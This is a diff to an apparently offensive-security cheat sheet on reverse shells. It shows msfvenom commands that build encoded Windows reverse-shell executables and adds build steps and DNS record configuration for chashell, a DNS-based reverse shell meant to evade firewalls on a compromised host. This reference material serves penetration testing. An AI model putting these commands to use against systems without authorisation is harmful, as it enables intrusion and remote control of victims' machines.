@@ -329,7 +329,7 @@ x86_64-w64-mingw32-gcc -o test.exe test.c
 
 ###### msfvenom reverse shell binary
 
-msfvenom can be used to create a reverse shell binary:
+`msfvenom` can be used to generate a reverse shell binary:
 
 ```
 # 32 bits
@@ -338,6 +338,35 @@ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<IP> LPORT
 # 64 bits
 msfvenom -a x64 --platform windows -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o <OUTBIN.exe>
 ```
+
+For more information on how to generate and use reverse shell binaries using
+the `Metasploit` framework, refer to the `Meterpreter` section below.
+
+###### chashell
+
+Chashell is a cross-platform Go reverse shell that communicates over DNS. It
+can be used to bypass firewalls or tightly restricted networks. As `chashell`
+relies on DNS, a Domain Name is required and must be bought and configured.  
+
+`chashell` makes use of a (multi-client) control server, `chaserv`, to receive
+the reverse shell connections.
+
+The following commands can be used to build the client and server and to
+configure the DNS record:
+
+```
+# Building
+export ENCRYPTION_KEY=$(python -c 'from os import urandom; print(urandom(32).encode("hex"))')
+export DOMAIN_NAME=<FQDN>
+make build-all
+
+# DNS record configuration
+<PREFIX> 300 IN A <SERVE_IP>
+c 300 IN NS <PREFIX>.<DOMAIN_NAME>.
+```
+
+The `chaserv` binary must be run on the control server and the `chashell`
+binary on the compromised host.
 
 ### (Optional) TTY
 
